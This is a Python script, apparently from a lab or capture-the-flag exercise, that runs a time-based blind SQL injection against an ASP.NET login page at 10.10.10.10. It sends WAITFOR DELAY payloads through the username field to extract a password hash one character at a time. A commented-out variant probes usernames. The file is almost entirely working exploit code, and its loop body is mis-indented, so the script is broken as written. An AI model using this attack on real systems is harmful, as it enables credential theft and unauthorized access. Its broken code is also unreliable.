#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Sample output:
"""
...
trying e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d265
trying e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d266
trying e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267
...
"""


import requests
import re
import string
import time

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_"
# Remove offending characters if needed
# for character in characters:
#     if character in "';\"":
#     	print(character)
#     	characters = characters.replace(character,"")


# Static Request Variables
url = 'http://10.10.10.10/'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
raw_params = '__VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB%2B%2FpXdQqiz9h%2Bj5nHjE4OqEYro7hz%2FkDYh48fQ%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQ5uNqOYHbIeyi7LRhe1%2B7mG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC%2FUYzzbo01YDuyOekjcuLek%3D'


# # For hand-testing SQL queries to ensure correct, prior to running loop
# username = "' IF EXISTS (SELECT 1 FROM users WHERE username LIKE 'b%') WAITFOR DELAY '0:0:3'--"
# password = ""
# raw_data = f"{raw_params}&ctl00%24ContentPlaceHolder1%24UsernameTextBox={username}&ctl00%24ContentPlaceHolder1%24PasswordTextBox={password}&ctl00%24ContentPlaceHolder1%24LoginButton=Enter"
# session = requests.Session()
# response = session.post(url, data=raw_data, headers=headers)
# content = response.text


# Loop to leak data. Starting with 32 characters with intent on finding a password hash.
seen = list()
session = requests.Session()
while ( len(seen) < 128 ):

        for character in characters:

        # Get start time
        start_time = time.time()
        # print("start time, start_time")

        # Send Request and show progress
        print("trying", "".join(seen) + character)
        username = "' IF EXISTS (SELECT 1 FROM users WHERE password_hash LIKE '" + "".join(seen) + character + "%') WAITFOR DELAY '0:0:1'--"
        password = ""
        raw_data = f"{raw_params}&ctl00%24ContentPlaceHolder1%24UsernameTextBox={username}&ctl00%24ContentPlaceHolder1%24PasswordTextBox={password}&ctl00%24ContentPlaceHolder1%24LoginButton=Enter"
        response = session.post(url, data=raw_data, headers=headers)
        content = response.text

        # Get end time
        end_time = time.time()
        difference = end_time - start_time
        # print("...end time", end_time, " and difference: ", difference)

        if ( difference > 1 ):
                # success, correct character!
                seen.append(character)
                break

print(content)
